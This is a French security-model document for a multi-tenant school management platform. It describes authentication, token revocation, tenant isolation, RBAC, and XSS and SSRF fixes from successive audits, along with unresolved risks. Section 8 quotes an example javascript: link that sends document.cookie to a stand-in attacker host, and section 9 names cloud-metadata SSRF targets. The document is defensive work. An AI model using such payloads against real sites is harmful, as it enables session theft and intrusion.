# Modèle de sécurité — Academy Guinéenne

État réel du modèle de sécurité tel que vérifié dans le code et par tests,
au fil des audits successifs de ce projet. Chaque section renvoie au code
qui l'implémente.

## 1. Authentification

- JWT natif (HS256, `python-jose`/`PyJWT`), pas de fournisseur externe.
  `backend/app/core/security.py`.
- MFA disponible (`backend/app/api/v1/endpoints/core/mfa.py`,
  `mfa_enabled` sur `User`), testé dans `test_mfa_enforcement.py`.
- Désactiver le MFA (`POST /mfa/totp/disable/`, `POST /mfa/toggle/` avec
  `enabled: false`) exige désormais le mot de passe actuel de l'appelant
  (institutional-readiness audit, 2026-09, 7e balayage) : avant ce
  correctif, un jeton d'accès valide seul (obtenu par XSS, fuite/log d'un
  jeton, un appareil sans surveillance...) suffisait à retirer
  définitivement le MFA d'un compte en une seule requête, sans mot de
  passe ni code TOTP/de secours. Même convention que le contrôle déjà
  existant sur `POST /auth/change-password/`. Activer le MFA ne demande
  toujours rien (aucun risque à protéger un compte davantage). Testé dans
  `test_totp_mfa_login.py::TestDisableTotpRequiresCurrentPassword`.
- Verrouillage de compte après tentatives échouées
  (`test_account_lockout.py`).
- Rate limiting sur les endpoints d'authentification (slowapi) :
  login 5/min, logout-all 5/min, bootstrap, reset password.

## 2. Cycle de vie du token

- Chaque token porte un `jti` unique (`sha256(f"{user_id}:{timestamp}")[:16]`).
- **Logout simple** : le `jti` du token courant est blacklisté dans Redis
  (`token_blacklist:{jti}`, TTL = durée de vie restante du token).
- **Logout-all** : bump d'une version (`sfp:user_token_version:{user_id}`)
  ET blacklist immédiate du token appelant par son vrai `jti` — corrigé en
  2026-07 après découverte que l'implémentation blacklistait par erreur un
  hash du token brut au lieu du `jti` réel (voir commit "fix(auth): corriger
  le jti de blacklist immédiat sur logout-all").
- Chaque route authentifiée (`get_current_user()`) vérifie la blacklist ET
  la version de token AVANT toute requête base de données — un token révoqué
  ou périmé par logout-all ne peut jamais atteindre la logique métier.
- Comportement fail-open documenté et assumé si Redis est indisponible
  (le token reste valide jusqu'à expiration naturelle plutôt que de bloquer
  toute l'API sur une panne Redis transitoire) — cohérent avec le reste des
  fonctionnalités optionnelles basées sur Redis dans ce projet (verrouillage
  de compte, historique de mots de passe, sessions actives).
- `GET /realtime/ws/{tenant_id}/{user_id}` (endpoint WebSocket) contournait
  entièrement ce qui précède (institutional-readiness audit, 2026-09, 8e
  balayage) : il décodait le JWT lui-même et faisait confiance à ses
  claims `roles`/`tenant_id` brutes, sans passer par `get_current_user()`
  — ni blacklist, ni version de logout-all, ni `is_active` re-vérifié en
  base. Un token encore valide d'un compte désactivé, d'une session
  déconnectée via logout-all, ou d'un rôle `SUPER_ADMIN` depuis révoqué en
  base continuait à authentifier ce canal pour toute la durée de vie du
  token. Corrigé en réutilisant `_evaluate_revocation()` (même fonction
  que `get_current_user()`) et en relisant `is_active`/les rôles depuis la
  base plutôt que depuis le token. Impact réel limité au moment du
  correctif : aucun publisher n'écrit sur le canal Redis
  (`tenant:{tenant_id}`) que cet endpoint écoute, donc la brèche était
  réelle mais inerte. Testé dans
  `test_realtime_websocket_revocation_2026_09_28.py`.
- **CORS** (`app/main.py`) : `BACKEND_CORS_ORIGINS="*"` était exempté de la
  coercition `https://` mais jamais réellement rejeté (institutional-
  readiness audit, 2026-09, 8e balayage) — `CORSMiddleware(allow_origins=
  ["*"], allow_credentials=True)` fait réfléchir par Starlette l'en-tête
  `Origin` réel de l'appelant avec `Access-Control-Allow-Credentials:
  true`, soit "n'importe quelle origine, avec les identifiants" pour
  chaque requête — l'inverse de ce qu'un commentaire (depuis corrigé)
  affirmait à tort être "impossible". L'authentification 100% Bearer (pas
  de cookie nulle part dans ce code) limitait l'exploitabilité réelle
  aujourd'hui, mais le démarrage refuse désormais explicitement tout
  `BACKEND_CORS_ORIGINS` contenant `*` (`SystemExit(1)`) plutôt que de
  compter sur cette seule architecture comme filet de sécurité. Testé
  dans `test_cors_wildcard_rejected_2026_09_28.py`.

## 3. Multi-tenant et isolation

- `TenantMixin` (`tenant_id` FK) sur la quasi-totalité des modèles.
- `TenantMiddleware` : exige un token bearer valide pour toute route hors
  liste blanche publique, et injecte le contexte tenant avant que FastAPI ne
  résolve les dépendances.
- Row-Level Security PostgreSQL activée (`ENABLE`/`FORCE ROW LEVEL
  SECURITY`) sur la majorité des tables, filtrée sur
  `current_setting('app.current_tenant_id')`.
- **Point d'attention documenté** (voir `docs/INSTITUTIONAL_ROLES.md`) :
  un rôle PostgreSQL superutilisateur contourne TOUJOURS RLS, `FORCE` ou
  pas. Le rôle Docker local (`schoolflow`) EST superutilisateur — RLS y est
  donc un no-op, et la vraie isolation tenant en local repose sur le
  filtrage `WHERE tenant_id = ...` de chaque endpoint, pas sur RLS.
  **Vérification automatisée depuis 2026-09** (`backend/app/main.py`,
  bloc de démarrage) : à chaque démarrage de l'API sur PostgreSQL, le rôle
  de connexion est interrogé (`pg_roles`) et un `logger.critical()` est émis
  s'il est superutilisateur ou `BYPASSRLS` — visible dans les logs
  applicatifs et Sentry, sans étape manuelle. Consultable aussi à la demande
  via `GET /platform/security/database-role/` (SUPER_ADMIN uniquement,
  jamais de secret retourné). **Reste à faire par un opérateur humain avec
  accès au déploiement réel** : lancer l'app contre la base de production et
  lire le résultat — cette session n'a pas cet accès. Requête manuelle
  équivalente si besoin : `SELECT rolname, rolsuper, rolbypassrls FROM
  pg_roles WHERE rolname = '<rôle prod>';`
  **Outillage livré depuis 2026-09** pour permettre à un opérateur de
  corriger ce point : `infra/azure/sql/create_app_role.sql` crée un rôle
  applicatif `NOSUPERUSER NOBYPASSRLS` sans privilège DDL — voir
  `docs/POSTGRES_APP_ROLE.md` pour la procédure complète et, surtout,
  pour les deux problèmes non résolus qui rendent son activation encore
  prématurée (section « Risques connus » ci-dessous).
- Isolation vérifiée par tests dédiés : `test_tenant_isolation.py`, et par
  isolation systématique dans chaque nouveau module ajouté (ex. transcripts,
  teachers, payment receipts — jamais de fuite inter-tenant même avec un
  identifiant deviné, confirmé par des tests explicites "cross-tenant 404").
- **Angle mort découvert et corrigé (2026-09, préparation mise en
  production nationale)** : chaque balayage RLS précédent (`659b47b029bd`,
  `c4d5e6f7a8b9`, `b5e71cce8a7a`) découvre les tables à protéger via
  `EXISTS (... attname = 'tenant_id')` — juste pour une table qui porte sa
  propre colonne `tenant_id`, mais structurellement aveugle à une table
  fille qui n'en a aucune (elle ne sera JAMAIS retrouvée, même en
  relançant le balayage indéfiniment). Cinq tables de ce type avaient RLS
  entièrement désactivé : `alumni_request_history`,
  `conversation_participants`, `email_otps`, `order_items`,
  `user_message_status`. Corrigé par la migration `20260927_0001`, qui
  scope chacune à sa table parente propriétaire du tenant via sa propre
  FK (ex. `conversation_id IN (SELECT id FROM conversations WHERE
  tenant_id::text = ...)`). Validé avec un rôle PostgreSQL réellement
  restreint (`NOSUPERUSER NOBYPASSRLS`, créé et détruit dans le test
  lui-même) plutôt qu'avec le rôle superutilisateur habituel de la suite
  de tests — sans quoi la vérification n'aurait rien prouvé (voir point
  ci-dessus). Le check de disponibilité (`app/main.py::_check_rls_status`,
  exposé par `/health/ready`) a le même angle mort de conception que les
  migrations catch-all qu'il reflète : il continuera de rapporter
  `"rls": "active"` sans jamais voir ce type de table. Non corrigé ici
  (nécessiterait de maintenir la même liste de tables parentes que cette
  migration, plutôt qu'une découverte générique) — suivi documenté, pas
  élargi dans ce correctif.

## 4. Rôles et permissions (RBAC)

11+ rôles définis dans `ROLE_PERMISSIONS` (`backend/app/core/security.py`) :
SUPER_ADMIN (wildcard `*`, plateforme, `tenant_id` NULL), TENANT_ADMIN,
DIRECTOR, DEPARTMENT_HEAD, TEACHER, STUDENT, PARENT, ALUMNI, STAFF,
ACCOUNTANT, SECRETARY, plus la hiérarchie institutionnelle en cours de
construction : MINISTRY_ADMIN (agrégats nationaux, jamais de détail par
établissement) et REGIONAL_DIRECTOR (agrégats restreints à sa propre
région — jamais la vue nationale). Chaque permission est vérifiée via
`require_permission("resource:action")`, pas de contrôle d'accès ad-hoc
dans les handlers.

## 5. Paiements et finance

- Aucune suppression physique d'un paiement — seul un statut `REVERSED`
  existe, toujours tracé.
- Toute annulation/correction est auditée (`log_audit`) avant `commit()`.
- Référence unique générée à l'enregistrement, réutilisée comme numéro de
  reçu.
- Le portail parent ne peut consulter que les factures/paiements de ses
  propres enfants (jointure `parent_students`, jamais un filtre côté
  frontend seul).

## 6. Audit

`backend/app/utils/audit.py` : toute mutation sensible (paiements,
affectations enseignants, décisions RGPD, etc.) écrit une entrée d'audit
avant le commit de la transaction métier — pas après, pour éviter une
perte de trace en cas d'échec partiel.

## 7. RGPD

Endpoints dédiés (`rgpd.py`) : droit à l'oubli, export de données,
consentements. Suppression de compte : demande tracée
(`account_deletion_requests`), pas de suppression immédiate silencieuse.

## 8. Frontend (XSS)

- Tout HTML fourni par un tenant/utilisateur et injecté via
  `dangerouslySetInnerHTML` passe par `sanitizeHtml()`
  (`src/lib/sanitize.ts`, DOMPurify), jamais brut.
- Tout lien externe fourni par un tenant/utilisateur et injecté dans un
  attribut `href` passe par `sanitizeUrl()` (même fichier — n'autorise
  que `http://`, `https://`, `mailto:`, `tel:`, renvoie `"#"` sinon).
- **Faille corrigée (institutional-readiness audit, 2026-09, 9e
  balayage)** : les 7 champs de réseaux sociaux de
  `TenantLandingSettings` (`facebook`, `instagram`, `twitter`, `youtube`,
  `facebook_url`, `twitter_url`, `linkedin_url`) n'avaient aucune
  validation de protocole côté backend, et 5 fichiers frontend (les
  templates de site public — `PublicPageView.tsx`, `PremiumFooter.tsx`,
  et les 3 templates legacy High School/University/DefaultLanding)
  injectaient ces valeurs directement dans un `href={...}` sans passer
  par `sanitizeUrl()`, alors que ce helper est correctement utilisé
  ailleurs dans les mêmes pages (`Hero.tsx`, `CTA.tsx`). N'importe quel
  admin de tenant pouvait donc configurer un lien du type
  `javascript:fetch('https://evil.example/?c='+document.cookie)` :
  `target="_blank" rel="noopener noreferrer"` bloque l'accès à
  `window.opener` mais n'empêche pas l'exécution d'une URI
  `javascript:` au clic. Comme le même domaine sert l'application
  authentifiée (JWT dans `localStorage`), un membre du personnel
  prévisualisant son propre site public aurait pu voir son jeton de
  session exfiltré. Corrigé des deux côtés (défense en profondeur) :
  les 5 fichiers frontend appliquent désormais `sanitizeUrl()` sur
  chaque `href` concerné, et `TenantLandingSettings` rejette tout
  protocole autre que `http(s)://` via un `field_validator` — vérifié
  au point d'écriture réel (`PATCH /tenants/settings/`, qui acceptait
  jusqu'ici n'importe quelle clé sans validation), pas seulement côté
  lecture publique (où l'exception aurait silencieusement vidé tout
  l'objet `landing` plutôt que de rejeter l'écriture fautive). Testé
  dans `test_tenant_landing_social_link_javascript_uri_2026_09_28.py`
  (backend) et `SocialLinksXss.test.tsx` (frontend, les 5 composants
  exercés directement).
- Jeton JWT stocké en `localStorage` (`src/api/client.ts`) — compromis
  classique d'une architecture 100 % Bearer sans cookie ; combiné à une
  XSS non corrigée, il permettrait le vol de session, d'où l'importance
  des deux règles ci-dessus.

## 9. SSRF (requêtes sortantes construites depuis une entrée tenant)

- Toute URL fournie par un tenant que le backend va lui-même chercher
  (webhook, image intégrée à un PDF généré côté serveur, etc.) doit
  passer par `assert_safe_external_url()`
  (`backend/app/core/ssrf_protection.py`) avant d'être utilisée : schéma
  `http(s)://` uniquement, résolution DNS de l'hôte puis rejet si UNE
  seule des adresses IP résolues tombe dans une plage privée/loopback/
  link-local/multicast/réservée (résoudre avant de vérifier — et non un
  filtrage textuel sur le nom d'hôte — ferme le contournement par un nom
  DNS qui pointe vers une IP interne).
- **Faille corrigée (institutional-readiness audit, 2026-09, 10e
  balayage)** : deux points d'entrée laissaient le backend effectuer une
  requête HTTP sortante vers une URL entièrement contrôlée par un
  TENANT_ADMIN (pas seulement SUPER_ADMIN), sans aucune validation de
  l'hôte cible :
  1. `POST /webhooks/` et `PATCH /webhooks/{id}/`
     (`api/v1/endpoints/core/webhooks.py`) — `WebhookCreate.url`/
     `WebhookUpdate.url` étaient typés `HttpUrl`, qui vérifie seulement
     que la chaîne est une URL http(s) bien formée, jamais l'hôte
     résolu. Combiné à `POST /webhooks/{id}/test/` (déclenchement
     immédiat) et à la livraison automatique sur chaque événement
     métier souscrit, un admin de tenant pouvait pointer un webhook vers
     `http://169.254.169.254/...` (métadonnées cloud) ou un service
     interne, et lire le booléen de succès de livraison comme un oracle
     SSRF aveugle et répétable.
  2. `POST /school-life/generate-report-card/pdf/` et
     `/generate-certificate/pdf/` (`api/v1/endpoints/operational/
     school_life.py`) — le logo (`Tenant.settings["logoUrl"]`) et les
     deux URLs de signature (`Tenant.director_signature_url`,
     `secretary_signature_url`), toutes modifiables par un TENANT_ADMIN,
     étaient injectées telles quelles dans un `<img src="...">` que
     WeasyPrint va chercher côté serveur au moment du rendu PDF.
  Corrigé par un garde-fou unique (`ssrf_protection.py`) appliqué aux
  deux points : validation à l'écriture ET à la livraison pour les
  webhooks (défense en profondeur contre une résolution DNS différente
  entre-temps, redirections HTTP désactivées), et un `url_fetcher`
  WeasyPrint dédié (sous-classe de `weasyprint.urls.URLFetcher`, elle
  aussi sans redirections) pour la génération de PDF — WeasyPrint
  absorbe une erreur de fetch par ressource et continue le rendu sans
  l'image plutôt que de planter, donc l'échec est silencieux côté
  utilisateur mais la requête interne n'est jamais émise. Testé dans
  `test_ssrf_protection_2026_09_28.py` (le garde-fou lui-même, y compris
  bout-en-bout via WeasyPrint réel), `test_webhook_ssrf_2026_09_28.py`
  (points d'entrée webhook), et `test_pdf_generation_ssrf_2026_09_28.py`
  (points d'entrée PDF, par espionnage de `assert_safe_external_url`
  pour prouver que le rendu réel invoque bien le garde-fou).
  Open redirect et upload de fichiers non restreint ont aussi été
  audités dans ce 10e balayage sans nouvelle découverte : aucune
  redirection serveur ne dépend d'une entrée utilisateur dans ce
  backend (API JSON pure), et la gestion d'upload (allow-list
  d'extensions, sniffing du type MIME par magic bytes, noms de fichiers
  UUID, confinement anti-traversée de chemin, `Content-Disposition:
  attachment` forcé sur tout ce qui n'est pas une image/police) était
  déjà solide.

## 10. Stockage documentaire (Azure Blob)

- Détail complet dans `docs/STORAGE_ARCHITECTURE.md` — résumé ici pour ce
  que ça change au modèle de sécurité :
  - **Aucune clé de compte de stockage** n'existe dans le code, les
    secrets, ou Git — authentification par identité managée
    (`azure.identity.DefaultAzureCredential`) + deux rôles RBAC minimaux
    (Storage Blob Data Contributor + Storage Blob Delegator), scopés au
    seul compte de stockage de l'environnement.
  - Le conteneur Blob n'autorise aucun accès public — tout téléchargement
    passe par une URL SAS à délégation utilisateur, signée à la demande et
    à durée de vie limitée, jamais un accès anonyme permanent.
  - En REC/PROD, une configuration Azure Blob absente ou invalide fait
    échouer le démarrage du process (`os._exit(1)`) plutôt que de
    retomber silencieusement sur un stockage local non durable — même
    contrat que `SECRET_KEY`/`BOOTSTRAP_SECRET`.
  - `/health/ready` et `/health/deep` exposent l'état du stockage
    (`connected`/`unreachable`/`disabled` + le backend actif) mais jamais
    de clé, jeton SAS ou chaîne de connexion — les gestionnaires d'erreur
    de `AzureBlobStorageClient` et des sondes de santé ne journalisent que
    le type d'exception, jamais son message (qui pourrait embarquer un
    identifiant sensible).
  - Testé dans `test_storage_provider_selection_2026_09_28.py` (sélection
    de backend, fail-closed REC/PROD, non-fuite de secret),
    `test_azure_blob_storage_operations_2026_09_28.py` (upload/download/
    exists/delete, génération SAS), et
    `test_storage_local_operations_2026_09_28.py` (traversée de chemin,
    isolation des clés entre tenants).

## 11. Réseau privé Azure (PostgreSQL et Redis)

- Détail complet dans `docs/AZURE_PRIVATE_NETWORKING.md`. Résumé
  sécurité : PostgreSQL Flexible Server (`infra/azure/modules/
  postgres.bicep`) est VNet-intégré (sous-réseau délégué) et n'a **plus
  aucun point de terminaison public** — l'ancienne règle de pare-feu
  `AllowAllAzureServices` (0.0.0.0-0.0.0.0, autorisant tout service Azure
  y compris d'autres abonnements) est supprimée entièrement, pas
  seulement resserrée. Redis (`modules/redis.bicep`) a
  `publicNetworkAccess: Disabled` et n'est joignable que via un Private
  Endpoint dans le même VNet — Basic/Standard ne supportant pas
  l'injection VNet directe (réservée au tier Premium), Private Link est
  le mécanisme de connectivité privée utilisé.
- L'authentification (mot de passe PostgreSQL, clé Redis) reste
  inchangée et continue d'être requise — ceci ajoute une couche
  d'isolation réseau en plus, pas un remplacement.
- L'ingress public des Container Apps `api`/`frontend` n'est pas affecté
  — seul le chemin sortant vers PostgreSQL/Redis a changé.
- Le compte de stockage Azure Blob (section 10) garde volontairement son
  point de terminaison public pour l'instant — Managed Identity + absence
  de clé de compte restent ses contrôles ; un Private Endpoint pour ce
  compte est une amélioration future possible, hors périmètre ici.

## Risques connus (non résolus, hors périmètre de cette session)

- **P1 (outillage livré, activation NON recommandée)** : le rôle
  PostgreSQL de production ne doit pas être superutilisateur, sinon RLS
  est un théâtre de sécurité en prod aussi. `infra/azure/sql/create_app_role.sql`
  fournit désormais un rôle applicatif restreint (`NOSUPERUSER
  NOBYPASSRLS`, aucun privilège DDL) et `DATABASE_URL_MIGRATIONS`/
  `effective_migrations_url` permettent à Alembic de continuer à
  fonctionner une fois ce rôle activé — voir `docs/POSTGRES_APP_ROLE.md`.
  **Ce risque n'est pas fermé** : des tests exhaustifs contre un vrai
  PostgreSQL, avec la connexion applicative effectivement pointée sur ce
  rôle restreint, ont révélé deux problèmes réels et non résolus qui
  rendent l'activation encore prématurée — voir les deux points
  ci-dessous, détaillés dans `docs/POSTGRES_APP_ROLE.md` (section
  « Ne pas encore activer en production »).
- **P1 (nouveau, découvert pendant les tests du point ci-dessus)** :
  `app/workers/tasks.py` (jobs ARQ d'arrière-plan — synchronisation
  WhatsApp, rappels de paiement, imports CSV, bulletins) utilise
  `SessionLocal()` directement sur une vingtaine de sites d'appel, sans
  jamais fixer le contexte RLS (`set_config('app.current_tenant_id',
  ...)`/`tenant_context.set(...)`). Ces jobs ne préservent l'isolation
  multi-tenant aujourd'hui que parce que la connexion actuelle bypass RLS
  — un vrai risque si le rôle applicatif est un jour restreint sans
  corriger ce point en premier.
- **P2 (nouveau, découvert pendant les tests du point ci-dessus)** :
  poisoning apparent du pool de connexions sous le rôle restreint —
  la suite backend complète produit un nombre d'échecs très supérieur à
  ce que les causes connues expliquent, avec des signes de transactions
  avortées (« current transaction is aborted ») qui contaminent des
  requêtes suivantes sans rapport. Pointe vers un chemin d'erreur de
  permission quelque part (probablement `app/core/database.py::get_db()`
  ou un appelant) qui n'appelle pas systématiquement `rollback()`. Non
  investigué plus avant dans cette session.
- **P2** : monitoring non ventilé par tenant — un tenant compromis ou
  abusif n'est pas isolable finement à ce jour.
- **P2** : pas de throttling par tenant (seulement par IP) — un tenant à
  fort trafic peut consommer les ressources des autres sur une
  infrastructure mutualisée.
